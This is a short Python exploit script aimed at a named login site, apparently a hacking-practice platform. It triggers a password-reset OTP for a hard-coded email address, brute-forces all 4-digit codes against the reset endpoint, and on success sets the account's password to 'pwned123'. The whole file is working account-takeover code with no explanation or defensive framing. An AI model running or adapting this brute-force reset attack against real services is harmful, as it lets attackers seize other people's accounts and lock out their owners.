#!/usr/bin/env python3

import requests
import signal
import sys


# global variables
email = "mvicentebolanos@gmail.com"
main_url = "http://thc.cybersapiens.in/login/"
new_password = "pwned123"


def ctrl_c(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# trap Ctrl+C
signal.signal(signal.SIGINT, ctrl_c)


def send_otp_code():
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    requests.post(main_url + "forgot_password_process.php", headers=headers, data=f"email={email}&reset=Continue")


def bruteforce_otp():
    for i in range(1, 10000):
        otp = '{:04d}'.format(i)
        s = requests.Session()
        
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = f"otp={otp}&check-reset-otp=Submit"
        r = s.post(main_url + "reset-code.php", headers=headers, data=data, allow_redirects=False)

        # valid OTP
        if r.headers.get("location") == "new-password.php":
            print(f"[+] Valid OTP: {otp}")
            
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = f"password={new_password}&cpassword={new_password}&change-password=Change"
            s.post(main_url + "new-password.php", headers=headers, data=data)


def main():
    send_otp_code()
    bruteforce_otp()


if __name__ == "__main__":
    main()
